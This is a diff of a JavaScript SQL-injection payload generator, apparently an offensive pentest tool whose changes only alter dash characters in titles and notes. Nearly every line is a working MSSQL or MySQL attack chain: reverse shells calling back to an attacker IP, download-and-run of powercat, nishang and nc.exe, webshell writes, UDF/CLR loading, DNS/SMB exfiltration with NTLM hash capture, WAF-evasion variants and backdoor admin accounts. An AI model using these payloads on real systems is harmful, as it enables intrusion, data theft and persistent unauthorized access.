+          return `-- CLR bypasses xp_cmdshell disable - only needs sp_configure 'clr enabled'\n-- Step 1: enable CLR\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;--\n\n-- Step 2: enable trustworthy on current DB (required for UNSAFE assembly)\n'; ALTER DATABASE master SET TRUSTWORTHY ON;--\n\n-- Step 3: create assembly from hex DLL (use msfvenom or WarSQLKit)\n-- msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f dll -o /tmp/clr.dll\n-- python3 -c "print('0x'+open('/tmp/clr.dll','rb').read().hex())" > /tmp/clr.hex\n'; CREATE ASSEMBLY clr_exec FROM 0x4D5A...<HEX_DLL>... WITH PERMISSION_SET=UNSAFE;--\n\n-- Step 4: create stored procedure from CLR method\n'; CREATE PROCEDURE [dbo].[sp_clr_exec] @cmd NVARCHAR(4000) AS EXTERNAL NAME clr_exec.[StoredProcedures].[exec_cmd];--\n\n-- Step 5: execute\n'; EXEC sp_clr_exec 'powershell -nop -w hidden -enc ${psB64}';--\n\n-- SHORTCUT: use WarSQLKit (pre-built CLR DLL for SQLi):\n-- https://github.com/NYAN-x-CAT/WarSQLKit\n-- Then: EXEC sp_WarSQLKit 'whoami';`;
         },
         note:(ip,port) => `CLR works when xp_cmdshell is disabled at OS level. Requires db_owner/sysadmin. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mssql-linked', title:'MSSQL — Linked Server lateral RCE pivot',
+        id:'mssql-linked', title:'MSSQL - Linked Server lateral RCE pivot',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `-- enumerate linked servers first:\n'; SELECT name,data_source FROM sys.servers;--\n\n-- pivot RCE to linked server (replace LINKED_SRV):\n'; EXEC ('xp_cmdshell ''powershell -nop -w h -c "IEX(iwr http://${ip}:${port}/s.ps1 -useb)"''') AT [LINKED_SRV];--`,
         note:'Runs OS commands on the linked SQL Server host without touching the network from your machine.'
       });
 
       all.push({
-        id:'mssql-full-chain', title:'MSSQL — ONE-SHOT full chain: enable + RCE (single stacked payload)',
+        id:'mssql-full-chain', title:'MSSQL - ONE-SHOT full chain: enable + RCE (single stacked payload)',
         db:['mssql'], tech:['rce'], ctx:['post','get','json'],
         payload: (ip,port) => {
           const psCmdStr = `$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`;
@@ -1558,34 +1558,34 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
       });
 
       all.push({
-        id:'mssql-schtasks', title:'MSSQL — schtasks RCE (Task Scheduler escape — wmic not needed)',
+        id:'mssql-schtasks', title:'MSSQL - schtasks RCE (Task Scheduler escape - wmic not needed)',
         db:['mssql'], tech:['rce'], ctx:['post','get','json'],
         payload: (ip,port) => {
           const b64 = b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`);
           return `'; EXEC xp_cmdshell 'schtasks /create /tn p /tr "powershell -nop -w hidden -enc ${b64}" /sc once /st 00:00 /f & schtasks /run /tn p & schtasks /delete /tn p /f';--`;
         },
-        note:(ip,port) => `schtasks runs via Task Scheduler — completely outside SQL Server job object. Survives Intruder timeout. nc -lvnp ${port} ← start BEFORE`
+        note:(ip,port) => `schtasks runs via Task Scheduler - completely outside SQL Server job object. Survives Intruder timeout. nc -lvnp ${port} ← start BEFORE`
       });
 
       all.push({
-        id:'mssql-ps-wmi', title:'MSSQL — PS WMI spawn (no wmic.exe — works on Server 2022)',
+        id:'mssql-ps-wmi', title:'MSSQL - PS WMI spawn (no wmic.exe - works on Server 2022)',
         db:['mssql'], tech:['rce'], ctx:['post','get','json'],
         payload: (ip,port) => {
           const b64 = b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`);
           return `'; EXEC xp_cmdshell 'powershell -c ([wmiclass]''root\\cimv2:Win32_Process'').Create(''powershell -nop -w hidden -enc ${b64}'')';--`;
         },
-        note:(ip,port) => `Uses PS WMI type accelerator — no wmic.exe needed. Spawns under WmiPrvSE.exe outside SQL job object. nc -lvnp ${port} ← start BEFORE`
+        note:(ip,port) => `Uses PS WMI type accelerator - no wmic.exe needed. Spawns under WmiPrvSE.exe outside SQL job object. nc -lvnp ${port} ← start BEFORE`
       });
 
       all.push({
-        id:'mssql-kw-bypass', title:'MSSQL — keyword split / concat bypass (WAF evading xp_cmdshell)',
+        id:'mssql-kw-bypass', title:'MSSQL - keyword split / concat bypass (WAF evading xp_cmdshell)',
         db:['mssql'], tech:['rce','bypass'], ctx:['post','get'],
         payload: (ip,port) => `-- Split keyword via string concat in EXEC:\n'; EXEC('xp_'+'cmdshell ''whoami''');--\n\n-- Via variable:\n'; DECLARE @c varchar(255); SET @c='xp_cmdshell'; EXEC @c 'whoami';--\n\n-- master..xp_cmdshell (alternative notation):\n'; EXEC master..xp_cmdshell 'whoami';--\n\n-- EXEC with Unicode N prefix:\n'; EXEC xp_cmdshell N'whoami';--\n\n-- Dynamic SQL with CHAR encoding (evades keyword scanner):\n'; EXEC(CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108));--`,
         note:'Use when WAF blocks the string "xp_cmdshell" literally. Test each variant.'
       });
 
       all.push({
-        id:'mssql-sqlagent', title:'MSSQL — SQL Server Agent job (xp_cmdshell alternative)',
+        id:'mssql-sqlagent', title:'MSSQL - SQL Server Agent job (xp_cmdshell alternative)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => {
           const psCmdStr = `$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`;
@@ -1596,35 +1596,35 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
       });
 
       all.push({
-        id:'mssql-openquery', title:'MSSQL — OPENQUERY lateral data read (linked server)',
+        id:'mssql-openquery', title:'MSSQL - OPENQUERY lateral data read (linked server)',
         db:['mssql'], tech:['union','rce'], ctx:['post','get'],
         payload: () => `-- read data from linked server via OPENQUERY:\n'; SELECT * FROM OPENQUERY([LINKED_SRV],'SELECT TOP 1 username,password FROM users');--\n\n-- RCE via OPENQUERY (passes query to remote server):\n'; SELECT * FROM OPENQUERY([LINKED_SRV],''SELECT 1;EXEC xp_cmdshell ''''whoami'''';'');--\n\n-- enumerate linked servers:\n'; SELECT name,product,data_source,is_remote_login_enabled FROM sys.servers WHERE is_linked=1;--`,
         note:'OPENQUERY executes queries remotely. Useful for lateral movement between SQL servers.'
       });
 
       all.push({
-        id:'mssql-bulk-insert', title:'MSSQL — BULK INSERT file read via UNC',
+        id:'mssql-bulk-insert', title:'MSSQL - BULK INSERT file read via UNC',
         db:['mssql'], tech:['oob','rce'], ctx:['post','get'],
         payload: (ip) => `-- create staging table:\n'; CREATE TABLE ##tmp(data nvarchar(max));--\n\n-- read local file into table:\n'; BULK INSERT ##tmp FROM 'C:\\Windows\\win.ini' WITH (FIELDTERMINATOR='|',ROWTERMINATOR='\\n');--\n\n-- exfil via UNION:\n'; UNION SELECT TOP 1 data,NULL FROM ##tmp;--\n\n-- read via UNC (triggers NTLM auth to Responder):\n'; BULK INSERT ##tmp FROM '\\\\${ip}\\share\\x.txt' WITH (FIELDTERMINATOR='|',ROWTERMINATOR='\\n');--`,
         note:(ip) => `UNC path triggers NTLM auth → run: sudo responder -I tun0 -wv  to capture hash`
       });
 
       all.push({
-        id:'mssql-powercat', title:'MSSQL — xp_cmdshell + powercat IEX (HTB Querier/Archetype style)',
+        id:'mssql-powercat', title:'MSSQL - xp_cmdshell + powercat IEX (HTB Querier/Archetype style)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://${ip}:${HP}/powercat.ps1''); powercat -c ${ip} -p ${port} -e cmd';--`,
         note:(ip,port) => `Kali: cp /usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1 /tmp/ && python3 -m http.server ${HP}. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mssql-nishang', title:'MSSQL — xp_cmdshell + nishang Invoke-PowerShellTcp IEX (classic OSCP)',
+        id:'mssql-nishang', title:'MSSQL - xp_cmdshell + nishang Invoke-PowerShellTcp IEX (classic OSCP)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://${ip}:${HP}/Invoke-PowerShellTcp.ps1'')';--\n-- OR append the call directly inside the ps1 before serving:\n-- echo "Invoke-PowerShellTcp -Reverse -IPAddress ${ip} -Port ${port}" >> /tmp/Invoke-PowerShellTcp.ps1`,
         note:(ip,port) => `Kali: cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/ && echo "Invoke-PowerShellTcp -Reverse -IPAddress ${ip} -Port ${port}" >> /tmp/Invoke-PowerShellTcp.ps1 && python3 -m http.server ${HP}. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mssql-ps-iwr-run', title:'MSSQL — xp_cmdshell + PS iwr drop & run (HTB EscapeTwo style)',
+        id:'mssql-ps-iwr-run', title:'MSSQL - xp_cmdshell + PS iwr drop & run (HTB EscapeTwo style)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => {
           const b64 = b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`);
@@ -1634,7 +1634,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
       });
 
       all.push({
-        id:'mssql-adduser', title:'MSSQL — add sysadmin user (persistence)',
+        id:'mssql-adduser', title:'MSSQL - add sysadmin user (persistence)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: () => `-- create SQL login:\n'; CREATE LOGIN hacker WITH PASSWORD='P@ssw0rd123!';--\n'; EXEC sp_addsrvrolemember 'hacker','sysadmin';--\n\n-- enable sa if disabled:\n'; ALTER LOGIN sa ENABLE;--\n'; ALTER LOGIN sa WITH PASSWORD='P@ssw0rd123!';--\n\n-- add existing user to sysadmin:\n'; EXEC sp_addsrvrolemember 'public','sysadmin';--`,
         note:'Creates persistent sysadmin access. Useful for re-entry after session drops.'
@@ -1643,14 +1643,14 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('oob')) {
       all.push({
-        id:'mssql-oob-dirtree', title:'MSSQL — OOB DNS exfil via xp_dirtree → Responder',
+        id:'mssql-oob-dirtree', title:'MSSQL - OOB DNS exfil via xp_dirtree → Responder',
         db:['mssql'], tech:['oob'], ctx:['post','get','json'],
         payload: (ip) => `-- basic SMB trigger (confirms OOB and captures NTLM hash):\n'; EXEC xp_dirtree '\\\\${ip}\\share';--\n\n-- exfil DB user in hostname:\n'; DECLARE @h varchar(1024);\nSELECT @h=SUSER_NAME();\nEXEC xp_dirtree('\\\\'+@h+'.${ip}\\x');--\n\n-- exfil with Burp Collaborator:\n'; EXEC xp_dirtree '\\\\YOUR_COLLAB.burpcollaborator.net\\x';--`,
         note:(ip) => `Kali: sudo responder -I tun0 -wv   OR   impacket-smbserver share . -smb2support\nCaptures NTLMv2 hash → crack with hashcat -m 5600`
       });
 
       all.push({
-        id:'mssql-oob-openrowset', title:'MSSQL — OOB via OPENROWSET DNS leak',
+        id:'mssql-oob-openrowset', title:'MSSQL - OOB via OPENROWSET DNS leak',
         db:['mssql'], tech:['oob'], ctx:['post','get'],
         payload: (ip) => `'; DECLARE @q varchar(1024);\nSET @q = (SELECT TOP 1 password FROM users);\nEXEC ('SELECT * FROM OPENROWSET(''SQLNCLI'',''server='+@q+'.${ip}\\sql;Trusted_Connection=yes'',''SELECT 1'')')--`,
         note:'Leaks data via DNS hostname in the OPENROWSET server string. Needs sysadmin.'
@@ -1659,7 +1659,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('union')) {
       all.push({
-        id:'mssql-union-chain', title:'MSSQL — full UNION enumeration chain',
+        id:'mssql-union-chain', title:'MSSQL - full UNION enumeration chain',
         db:['mssql'], tech:['union'], ctx:['post','get'],
         payload: () => `-- Step 1: find column count (increment until error stops)\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n\n-- Step 2: confirm UNION (replace N with column count)\n' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT 'a',NULL,NULL--\n\n-- Step 3: enumerate\n' UNION SELECT TOP 1 DB_NAME(),@@version,SUSER_NAME()--\n' UNION SELECT TOP 1 name,NULL,NULL FROM sys.databases--\n' UNION SELECT TOP 1 TABLE_NAME,NULL,NULL FROM INFORMATION_SCHEMA.TABLES--\n' UNION SELECT TOP 1 COLUMN_NAME,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--\n' UNION SELECT TOP 1 username+0x3a+password,NULL,NULL FROM users--`
       });
@@ -1667,7 +1667,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'mssql-err-chain', title:'MSSQL — error-based data exfil (CONVERT trick)',
+        id:'mssql-err-chain', title:'MSSQL - error-based data exfil (CONVERT trick)',
         db:['mssql'], tech:['err'], ctx:['post','get'],
         payload: () => `' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=CONVERT(int,(SELECT DB_NAME()))--\n' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES))--\n' AND 1=CONVERT(int,(SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'))--\n' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--\n' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--`
       });
@@ -1675,7 +1675,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'mssql-blind', title:'MSSQL — blind boolean + time-based chain',
+        id:'mssql-blind', title:'MSSQL - blind boolean + time-based chain',
         db:['mssql'], tech:['blind'], ctx:['post','get','json'],
         payload: () => `-- boolean: different response means condition is TRUE\n' AND (SELECT COUNT(*) FROM users)>0--\n' AND SUBSTRING(DB_NAME(),1,1)='m'--\n' AND LEN((SELECT TOP 1 password FROM users))>7--\n' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--\n\n-- time-based (5s delay = condition TRUE)\n'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--\n'; IF SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1)='a' WAITFOR DELAY '0:0:5'--`
       });
@@ -1687,21 +1687,21 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'mysql-direct-shell', title:'MySQL — DIRECT shell payloads (Intruder-ready, standalone)',
+        id:'mysql-direct-shell', title:'MySQL - DIRECT shell payloads (Intruder-ready, standalone)',
         db:['mysql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"');--\n'; SELECT sys_exec('nc -e /bin/sh ${ip} ${port}');--\n'; SELECT sys_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port}>/tmp/f');--\n' UNION SELECT sys_exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"'),2,3--+\n' UNION SELECT 1,sys_exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1'),3--+`,
         note:(ip,port) => `sys_exec requires UDF loaded. If not loaded use stacked UDF chain below. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mysql-shell-chain', title:'MySQL — FULL CHAIN: stacked → UDF load → bash shell (Intruder sequence)',
+        id:'mysql-shell-chain', title:'MySQL - FULL CHAIN: stacked → UDF load → bash shell (Intruder sequence)',
         db:['mysql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; SELECT SLEEP(5);--\n'; SELECT @@plugin_dir;--\n'; SELECT 0x7f454c46 INTO DUMPFILE '/tmp/udf_test';--\n'; DROP FUNCTION IF EXISTS sys_exec;--\n'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';--\n'; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"');--`,
         note:(ip,port) => `Send in order via Intruder Sniper. lib_mysqludf_sys.so must exist in plugin_dir. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mysql-outfile-rce', title:'MySQL — INTO OUTFILE webshell → curl trigger → bash shell',
+        id:'mysql-outfile-rce', title:'MySQL - INTO OUTFILE webshell → curl trigger → bash shell',
         db:['mysql'], tech:['rce','fw'], ctx:['post','get'],
         payload: (ip,port) => `' UNION SELECT '<?php system($_GET[c]);?>',2,3 INTO OUTFILE '/var/www/html/sh.php'--+\n' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/sh.php'--+\n' UNION SELECT '<?php passthru($_GET[c]);?>',2,3 INTO OUTFILE '/var/www/html/sh.php'--+\n' UNION SELECT '<?php passthru("bash -c \\"bash -i >& /dev/tcp/${ip}/${port} 0>&1\\"");?>',2,3 INTO OUTFILE '/var/www/html/sh.php'--+`,
         note:(ip,port) => `After shell.php written: curl http://TARGET/sh.php?c=id to verify, then trigger reverse shell. nc -lvnp ${port}`
@@ -1710,16 +1710,16 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce') || techs.includes('fw')) {
       all.push({
-        id:'mysql-generallog', title:'MySQL — general_log webshell (bypasses secure_file_priv — most reliable)',
+        id:'mysql-generallog', title:'MySQL - general_log webshell (bypasses secure_file_priv - most reliable)',
         db:['mysql'], tech:['rce','fw'], ctx:['post','get'],
-        payload: (ip,port) => `-- BYPASSES secure_file_priv restriction — works even when OUTFILE fails\n-- Requires: SUPER or SYSTEM_VARIABLES_ADMIN privilege + stacked queries\n-- Step 1: check current value (confirm attack surface)\n'; SELECT @@general_log, @@general_log_file;--\n\n-- Step 2: redirect log to web root\n'; SET GLOBAL general_log='on';--\n'; SET GLOBAL general_log_file='/var/www/html/sh.php';--\n\n-- Step 3: write shell via query (appears verbatim in log file)\n'; SELECT '<?php system($_GET[c]);?>';--\n\n-- Step 4: access shell + trigger rev shell\n-- curl "http://TARGET/sh.php?c=id"\n-- curl "http://TARGET/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"\n\n-- Step 5: restore (cleanup)\n'; SET GLOBAL general_log_file='';--\n'; SET GLOBAL general_log='off';--`,
+        payload: (ip,port) => `-- BYPASSES secure_file_priv restriction - works even when OUTFILE fails\n-- Requires: SUPER or SYSTEM_VARIABLES_ADMIN privilege + stacked queries\n-- Step 1: check current value (confirm attack surface)\n'; SELECT @@general_log, @@general_log_file;--\n\n-- Step 2: redirect log to web root\n'; SET GLOBAL general_log='on';--\n'; SET GLOBAL general_log_file='/var/www/html/sh.php';--\n\n-- Step 3: write shell via query (appears verbatim in log file)\n'; SELECT '<?php system($_GET[c]);?>';--\n\n-- Step 4: access shell + trigger rev shell\n-- curl "http://TARGET/sh.php?c=id"\n-- curl "http://TARGET/sh.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"\n\n-- Step 5: restore (cleanup)\n'; SET GLOBAL general_log_file='';--\n'; SET GLOBAL general_log='off';--`,
         note:(ip,port) => `Works when secure_file_priv blocks OUTFILE. No FILE priv needed for log redirect (SUPER suffices). nc -lvnp ${port}`
       });
     }
 
     if (techs.includes('rce') || techs.includes('blind')) {
       all.push({
-        id:'mysql-stacked', title:'MySQL — stacked queries + UDF full procedure chain',
+        id:'mysql-stacked', title:'MySQL - stacked queries + UDF full procedure chain',
         db:['mysql'], tech:['rce','blind'], ctx:['post','get'],
         payload: (ip,port) => `-- Stacked queries work with MySQLi multi_query() or when PDO::MYSQL_ATTR_MULTI_STATEMENTS=true\n-- Most modern PHP PDO does NOT allow stacked. Test with time-based:\n'; SELECT SLEEP(5);--\n'; SELECT IF(1=1,SLEEP(5),0);--\n\n-- If stacked works, create a stored procedure for RCE:\n'; DROP PROCEDURE IF EXISTS exec_cmd; CREATE PROCEDURE exec_cmd(cmd varchar(255)) BEGIN SET @q=concat('SELECT "',cmd,'" INTO OUTFILE "/var/www/html/x.php"'); PREPARE s FROM @q; EXECUTE s; DEALLOCATE PREPARE s; END;--\n'; CALL exec_cmd('<?php system($_GET[c]);?>');--\n\n-- UDF install via stacked (Linux):\n'; SELECT 0x...(UDF hex)... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';--\n'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';--\n'; SELECT sys_exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1');--`,
         note:(ip,port) => `Test SLEEP first. If stacked works and FILE privilege exists, UDF path gives full RCE. nc -lvnp ${port}`
@@ -1728,7 +1728,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('fw')) {
       all.push({
-        id:'mysql-outfile', title:'MySQL — SELECT INTO OUTFILE webshell',
+        id:'mysql-outfile', title:'MySQL - SELECT INTO OUTFILE webshell',
         db:['mysql'], tech:['fw'], ctx:['post','get'],
         payload: () => `-- requires: FILE privilege + writable web root + secure_file_priv="" in my.cnf\n' UNION SELECT '<?php system($_REQUEST[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--+\n\n-- common web root paths to try:\n-- /var/www/html/   /var/www/   /srv/http/   /usr/share/nginx/html/\n-- C:\\xampp\\htdocs\\   C:\\inetpub\\wwwroot\\   C:\\wamp\\www\\\n\n-- access your shell:\n-- http://TARGET/shell.php?c=id`,
         note:'If secure_file_priv is set to a non-empty value, this will fail. Check @@secure_file_priv first.'
@@ -1737,30 +1737,30 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'mysql-udf-win', title:'MySQL — UDF RCE on Windows (lib_mysqludf_sys.dll)',
+        id:'mysql-udf-win', title:'MySQL - UDF RCE on Windows (lib_mysqludf_sys.dll)',
         db:['mysql'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- Windows MySQL UDF — different path and DLL than Linux\n-- Step 1: find plugin_dir (usually C:\\ProgramData\\MySQL\\...\\lib\\plugin\\)\n' UNION SELECT 1,@@plugin_dir,3--+\n\n-- Step 2: write DLL via DUMPFILE (lib_mysqludf_sys.dll hex)\n-- Get hex: python3 -c "print('0x'+open('lib_mysqludf_sys.dll','rb').read().hex())"\n-- Source: https://github.com/mysqludf/lib_mysqludf_sys\n'; SELECT 0x<DLL_HEX> INTO DUMPFILE 'C:\\\\ProgramData\\\\MySQL\\\\MySQL Server 8.0\\\\lib\\\\plugin\\\\udf.dll';--\n\n-- Step 3: create function\n'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';--\n\n-- Step 4: add admin user (Windows — easier than reverse shell)\n'; SELECT sys_exec('net user hacker P@ssw0rd! /add');--\n'; SELECT sys_exec('net localgroup administrators hacker /add');--\n\n-- or reverse shell via cmd.exe:\n'; SELECT sys_exec('cmd /c powershell -nop -w hidden -enc ${b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`)}');--`,
+        payload: (ip,port) => `-- Windows MySQL UDF - different path and DLL than Linux\n-- Step 1: find plugin_dir (usually C:\\ProgramData\\MySQL\\...\\lib\\plugin\\)\n' UNION SELECT 1,@@plugin_dir,3--+\n\n-- Step 2: write DLL via DUMPFILE (lib_mysqludf_sys.dll hex)\n-- Get hex: python3 -c "print('0x'+open('lib_mysqludf_sys.dll','rb').read().hex())"\n-- Source: https://github.com/mysqludf/lib_mysqludf_sys\n'; SELECT 0x<DLL_HEX> INTO DUMPFILE 'C:\\\\ProgramData\\\\MySQL\\\\MySQL Server 8.0\\\\lib\\\\plugin\\\\udf.dll';--\n\n-- Step 3: create function\n'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';--\n\n-- Step 4: add admin user (Windows - easier than reverse shell)\n'; SELECT sys_exec('net user hacker P@ssw0rd! /add');--\n'; SELECT sys_exec('net localgroup administrators hacker /add');--\n\n-- or reverse shell via cmd.exe:\n'; SELECT sys_exec('cmd /c powershell -nop -w hidden -enc ${b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`)}');--`,
         note:(ip,port) => `Windows MySQL plugin_dir varies by version. DLL name must match SONAME exactly. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mysql-event-scheduler', title:'MySQL — Event Scheduler RCE (no stacked queries needed in same session)',
+        id:'mysql-event-scheduler', title:'MySQL - Event Scheduler RCE (no stacked queries needed in same session)',
         db:['mysql'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- Event Scheduler fires independently — bypasses "stacked queries not allowed" restriction\n-- Requires: EVENT privilege + sys_exec UDF already loaded\n\n-- Step 1: confirm event scheduler is on\n'; SELECT @@event_scheduler;--\n\n-- Step 2: enable if off\n'; SET GLOBAL event_scheduler=ON;--\n\n-- Step 3: create one-shot event for reverse shell\n'; CREATE EVENT IF NOT EXISTS rev_shell ON SCHEDULE AT NOW() + INTERVAL 3 SECOND ON COMPLETION NOT PRESERVE ENABLE DO SELECT sys_exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"');--\n\n-- Step 4 (Windows variant):\n'; CREATE EVENT IF NOT EXISTS rev_shell ON SCHEDULE AT NOW() + INTERVAL 3 SECOND ON COMPLETION NOT PRESERVE ENABLE DO SELECT sys_exec('cmd /c certutil -urlcache -split -f http://${ip}:${HP}/nc.exe %TEMP%\\\\nc.exe & %TEMP%\\\\nc.exe ${ip} ${port} -e cmd.exe');--\n\n-- cleanup:\n'; DROP EVENT IF EXISTS rev_shell;--`,
-        note:(ip,port) => `Event fires 3s after inject — start listener first. Works even when PDO blocks stacked queries. nc -lvnp ${port}`
